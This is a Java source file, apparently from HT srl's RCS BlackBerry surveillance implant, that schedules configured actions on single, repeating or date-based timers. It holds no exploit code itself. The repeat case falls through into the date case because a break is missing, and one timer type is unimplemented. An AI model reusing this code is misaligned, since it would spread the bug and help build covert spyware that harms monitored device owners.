/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : TimerEvent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.event;

import java.io.EOFException;
import java.util.Date;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.Conf;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class TimerEvent extends Event {
    private static final int SLEEP_TIME = 1000;

    private static Debug debug = new Debug("TimerEvent", DebugLevel.VERBOSE);

    int type;
    long loDelay;
    long hiDelay;

    Date timestamp;

    public TimerEvent(int actionId, byte[] confParams) {
        super(Event.EVENT_TIMER, actionId, confParams);
    }

    public TimerEvent(int actionId_, int type_, int loDelay_, int hiDelay_) {
        super(Event.EVENT_TIMER, actionId_);
        this.type = type_;
        this.loDelay = loDelay_;
        this.hiDelay = hiDelay_;
    }

    protected void eventRun() {
        debug.trace("EventRun");
        Check.requires(statusObj != null, "StatusObj NULL");
        timestamp = new Date();
        Date now;
        long wait;

        for (;;) {
            switch (this.type) {
            case Conf.CONF_TIMER_SINGLE:
                debug.trace("TIMER_SINGLE");

                wait = loDelay;
                now = new Date();

                /*
                 * debug.trace("now:"+now.getTime());
                 * debug.trace("timestamp:"+timestamp.getTime());
                 * debug.trace("diff:"+ (now.getTime() -
                 * timestamp.getTime())+" wait:"+wait);
                 */
                if (now.getTime() - timestamp.getTime() > wait) {
                    debug.trace("triggering:" + actionId);
                    statusObj.triggerAction(actionId);
                    stop();
                    return;
                }

                break;
            case Conf.CONF_TIMER_REPEAT:
                debug.trace("TIMER_REPEAT");

                wait = loDelay;
                now = new Date();

                if (now.getTime() - timestamp.getTime() > wait) {
                    timestamp = now;
                    statusObj.triggerAction(actionId);
                }
            case Conf.CONF_TIMER_DATE:
                debug.trace("TIMER_DATE");

                long tmpTime = hiDelay << 32;
                tmpTime += loDelay;

                Date tmpDate = new Date(tmpTime);
                debug.trace(tmpDate.toString());

                now = new Date();

                if (now.getTime() > tmpTime) {
                    statusObj.triggerAction(actionId);
                    stop();
                    return;
                }

                break;
            case Conf.CONF_TIMER_DELTA:
                // TODO: da implementare
                debug.trace("TIMER_DELTA");
                break;
            default:
                debug.error("shouldn't be here");
                break;
            }

            if (eventSleep(SLEEP_TIME)) {
                debug.trace("EventSleep exit");
                return;
            }
        }
    }

    protected boolean parse(byte[] confParams) {
        DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            this.type = databuffer.readInt();
            this.loDelay = databuffer.readInt();
            this.hiDelay = databuffer.readInt();

            debug
                    .trace("type: " + type + " lo:" + loDelay + " hi:"
                            + hiDelay);

        } catch (EOFException e) {
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

}
